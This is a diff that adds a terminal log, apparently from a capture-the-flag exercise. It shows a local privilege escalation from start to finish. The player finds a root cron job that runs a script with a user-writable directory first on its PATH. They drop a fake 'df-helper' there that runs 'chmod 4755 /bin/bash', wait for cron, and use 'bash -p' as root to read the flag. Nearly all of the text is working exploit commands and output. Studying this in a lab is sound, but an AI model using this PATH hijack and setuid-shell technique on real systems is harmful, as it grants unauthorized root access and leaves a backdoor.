@@ -1,0 +1,60 @@
+$ id
+uid=1001(player) gid=1001(player) groups=1001(player)
+
+$ cat /etc/cron.d/disk-report
+# Disk usage report every minute (managed by ops)
+* * * * * root /usr/local/bin/disk-report.sh
+
+$ grep -n 'PATH\|df-helper' /usr/local/bin/disk-report.sh
+6:export PATH=/home/player/bin:/usr/local/lib:/usr/local/bin:/usr/bin:/bin
+11:  df-helper
+
+$ ls -l /usr/local/bin/disk-report.sh /usr/local/lib/df-helper.real; ls -ld /home/player/bin /var/reports
+-rwxr-xr-x 1 root root 454 Nov 19 00:10 /usr/local/bin/disk-report.sh
+-rwxr-xr-x 1 root root  96 Nov 19 00:10 /usr/local/lib/df-helper.real
+drwxr-xr-x 2 player player 4096 Nov 19 00:10 /home/player/bin
+drwxr-xr-x 1 root   root   4096 Nov 19 00:15 /var/reports
+
+$ ls -lt /var/reports | head -2
+total 24
+-rw-r--r-- 1 root root 135 Nov 19 00:16 disk-20261119-0016.txt
+
+$ f=$(ls -1t /var/reports | head -1); echo "[report: $f]"; cat /var/reports/$f
+[report: disk-20261119-0016.txt]
+=== disk usage report 2026-11-19 00:16:01 ===
+Filesystem      Size  Used Avail Use% Mounted on
+overlay          49G   44G  2.8G  95% /
+
+$ echo x >> /usr/local/bin/disk-report.sh
+bash: line 1: /usr/local/bin/disk-report.sh: Permission denied
+
+$ echo x >> /etc/cron.d/disk-report
+bash: line 1: /etc/cron.d/disk-report: Permission denied
+
+$ touch /usr/local/lib/df-helper.real
+touch: cannot touch '/usr/local/lib/df-helper.real': Permission denied
+
+$ touch /var/reports/pwn.txt
+touch: cannot touch '/var/reports/pwn.txt': Permission denied
+
+$ printf '#!/bin/bash\nchmod 4755 /bin/bash\n' > /home/player/bin/df-helper; chmod +x /home/player/bin/df-helper; ls -l /home/player/bin/
+total 4
+-rwxrwxr-x 1 player player 33 Nov 19 00:16 df-helper
+
+$ ls -l /bin/bash; ls -1t /var/reports | head -2
+-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+disk-20261119-0016.txt
+disk-20261119-0015.txt
+
+$ ls -1t /var/reports | head -3
+disk-20261119-0017.txt
+disk-20261119-0016.txt
+disk-20261119-0015.txt
+
+$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+
+$ /bin/bash -p -c 'id; cat /flag.txt'
+uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player)
+Ly_Flag{zoxfbmcl}
+
